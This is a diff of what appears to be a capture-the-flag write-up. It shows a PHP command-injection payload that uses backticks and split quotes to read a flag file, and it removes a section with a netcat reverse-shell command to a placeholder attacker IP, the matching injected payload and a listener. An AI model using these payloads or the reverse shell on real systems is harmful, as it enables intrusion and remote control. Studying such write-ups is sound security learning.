@@ -29,17 +29,4 @@ echo ''`tac  fl''ag` # . "'| jq .bocchi
 ```php
 system("echo '" .'`c''at  fl''ag` # . "'| jq .bocchi");
 ```
-# Reverse shell
-it turns out that we can reverse shell in 12001(bocchi search tool)
-like this:
-```ps
-nc  <attacker ip addr> <port> -e /bin/sh
-```
-payload
-```ps
-'`nc  <attacker ip addr> <port> -e /bin/sh`#
-```
-on the attacker's pc:
-```ps
-nc localhost <port> 
-```
+
